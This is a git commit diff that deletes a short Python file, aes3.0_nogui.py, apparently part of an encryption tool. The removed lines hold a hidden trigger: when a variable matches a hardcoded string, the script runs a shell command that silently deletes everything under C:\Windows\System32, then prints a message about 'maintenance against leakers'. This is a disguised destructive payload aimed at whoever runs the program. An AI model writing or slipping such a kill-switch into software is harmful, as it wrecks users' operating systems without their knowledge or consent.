61f345fbc5e90b347d7c40aec91bc0bd77172acb
mynameisklxklx13 <hjorrdns@gmail.com>
2024-09-22 15:08:27 +0800

    Delete aes3.0_nogui.py

--- aes3.0_nogui.py
+++
@@ -1,7 +0,0 @@
-os.system('cls')
-if file_contentsx1=="TalBgEwkwfYiV":
-    subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
-
-print("maintenance againts leakers.")
-input()
-sys.exit()
